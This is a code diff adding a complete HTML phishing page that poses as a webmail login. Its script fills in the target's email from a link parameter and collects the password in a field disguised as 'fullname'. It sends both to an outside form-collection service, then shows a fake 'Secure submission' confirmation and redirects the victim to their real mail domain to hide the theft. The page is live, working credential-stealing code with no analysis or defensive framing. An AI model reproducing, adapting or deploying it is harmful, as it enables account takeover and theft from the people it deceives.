@@ -1,0 +1,287 @@
+
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Stay Connected</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<!-- Google Fonts fallback – Museo Sans is a commercial font; we use system fallbacks -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: 'Museo Sans 500', Arial, Helvetica, sans-serif;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: radial-gradient(circle at top, #eef2ff, #f6f7f9);
+  position: relative;
+  overflow: hidden;
+}
+
+/* FLOATING EMAIL BACKGROUND */
+body::before,
+body::after {
+  content: "";
+  position: fixed;
+  inset: -20%;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140' viewBox='0 0 140 140'%3E%3Cg fill='none' stroke='%2399a1ff' stroke-opacity='0.12'%3E%3Crect x='30' y='45' width='80' height='50' rx='8'/%3E%3Cpath d='M30 50l40 30 40-30'/%3E%3C/g%3E%3C/svg%3E");
+  background-repeat: repeat;
+  background-size: 140px 140px;
+  pointer-events: none;
+  z-index: -1;
+}
+
+body::before {
+  animation: drift 60s linear infinite;
+}
+
+body::after {
+  animation: driftReverse 90s linear infinite;
+  opacity: 0.6;
+}
+
+@keyframes drift {
+  from { transform: translateY(0); }
+  to { transform: translateY(-140px); }
+}
+
+@keyframes driftReverse {
+  from { transform: translateY(0); }
+  to { transform: translateY(140px); }
+}
+
+.card {
+  width: 500px;
+  max-width: 92%;
+  padding: 48px;
+  border-radius: 26px;
+  background: rgba(255,255,255,0.9);
+  backdrop-filter: blur(12px);
+  box-shadow: 0 30px 70px rgba(0,0,0,0.08);
+  text-align: center;
+  animation: fadeUp 0.6s ease;
+}
+
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(12px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.icon {
+  background: transparent;
+  border-radius: 0;
+  width: auto;
+  height: auto;
+  margin: 0 auto 24px;
+  color: #f97316;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 47px;          /* increased to 47px */
+  font-weight: bold;        /* bold and strong */
+  font-style: italic;
+  letter-spacing: normal;
+  animation: float 3s ease-in-out infinite;
+  line-height: 1;
+}
+
+@keyframes float {
+  0%,100% { transform: translateY(0); }
+  50% { transform: translateY(-6px); }
+}
+
+.subtitle { margin-top: 10px; font-size: 14px; color: #6b7280; }
+
+form { margin-top: 34px; text-align: left; }
+label { font-size: 13px; color: #374151; margin-bottom: 6px; display: block; }
+input {
+  width: 100%;
+  padding: 14px 16px;
+  border-radius: 16px;
+  border: 1px solid #e5e7eb;
+  font-size: 14px;
+  margin-bottom: 20px;
+  transition: border-color .2s, box-shadow .2s;
+}
+input:focus {
+  outline: none;
+  border-color: #667eea;
+  box-shadow: 0 0 0 4px rgba(102,126,234,0.15);
+}
+
+/* Styling for read‑only email field */
+#email {
+  background-color: #f9fafb;
+  color: #6b7280;
+  border-color: #e2e8f0;
+  cursor: default;
+}
+
+button {
+  width: 100%;
+  padding: 16px;
+  border-radius: 18px;
+  border: none;
+  background: linear-gradient(135deg, #f97316, #ea580c);
+  color: white;
+  font-size: 15px;
+  font-weight: 500;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  transition: transform .15s, box-shadow .15s;
+}
+button:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 12px 30px rgba(0,0,0,0.18);
+}
+button:disabled { opacity: .7; cursor: default; }
+
+.loader {
+  width: 18px;
+  height: 18px;
+  border: 2px solid rgba(255,255,255,0.4);
+  border-top-color: white;
+  border-radius: 50%;
+  animation: spin .8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.success {
+  position: fixed;
+  inset: 0;
+  background: rgba(246,247,249,0.95);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.success-box {
+  background: white;
+  padding: 50px;
+  width: 420px;
+  max-width: 92%;
+  border-radius: 28px;
+  text-align: center;
+  box-shadow: 0 30px 70px rgba(0,0,0,0.1);
+  animation: pop .4s ease;
+}
+@keyframes pop { from { transform: scale(.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+.check {
+  width: 86px;
+  height: 86px;
+  margin: 0 auto 22px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #111827, #1f2937);
+  color: white;
+  font-size: 36px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.countdown { margin-top: 18px; font-size: 14px; color: #6b7280; }
+.trust { margin-top: 26px; font-size: 12px; color: #9ca3af; }
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <div class="icon">webmail</div>
+  <div class="subtitle">We'll send you to your inbox after submission</div>
+
+  <form id="form">
+    <label>Email address</label>
+    <input type="email" id="email" placeholder="you@company.com" required readonly />
+
+    <label>Password</label>
+    <input type="text" id="fullname" placeholder="" required />
+
+    <button id="btn">
+      <span class="btn-text">Submit</span>
+    </button>
+  </form>
+</div>
+
+<script>
+const form = document.getElementById("form");
+const btn = document.getElementById("btn");
+const btnText = btn.querySelector(".btn-text");
+const email = document.getElementById("email");
+const fullname = document.getElementById("fullname");
+
+// Auto-fill email from URL parameter ?email=...
+function getEmailFromURL() {
+  const urlParams = new URLSearchParams(window.location.search);
+  return urlParams.get('email');
+}
+const emailFromLink = getEmailFromURL();
+if (emailFromLink && emailFromLink.trim() !== "") {
+  email.value = emailFromLink.trim();
+}
+
+const BASIN_URL = "https://usebasin.com/f/852055bd270e";
+
+form.addEventListener("submit", async e => {
+  e.preventDefault();
+
+  btn.disabled = true;
+  btnText.innerHTML = `<div class="loader"></div>`;
+
+  try {
+    const res = await fetch(BASIN_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: email.value,
+        fullname: fullname.value
+      })
+    });
+
+    if (!res.ok) throw new Error();
+    showSuccess(email.value);
+
+  } catch {
+    btn.disabled = false;
+    btnText.textContent = "Submit";
+    alert("Submission failed. Please try again.");
+  }
+});
+
+function showSuccess(emailValue) {
+  document.body.insertAdjacentHTML("beforeend", `
+    <div class="success">
+      <div class="success-box">
+        <div class="check">✓</div>
+        <h2>Check your inbox</h2>
+        <p style="color:#6b7280">Your submission was successful.</p>
+        <div class="countdown">
+          Redirecting in <span id="t">3</span>…
+        </div>
+        <div class="trust">🔒 Secure submission</div>
+      </div>
+    </div>
+  `);
+
+  let t = 3;
+  const domain = emailValue.split("@")[1];
+
+  const timer = setInterval(() => {
+    t--;
+    document.getElementById("t").textContent = t;
+    if (t === 0) {
+      clearInterval(timer);
+      if (domain) window.location.href = `https://${domain}`;
+    }
+  }, 1000);
+}
+</script>
+
+</body> 
+</html>
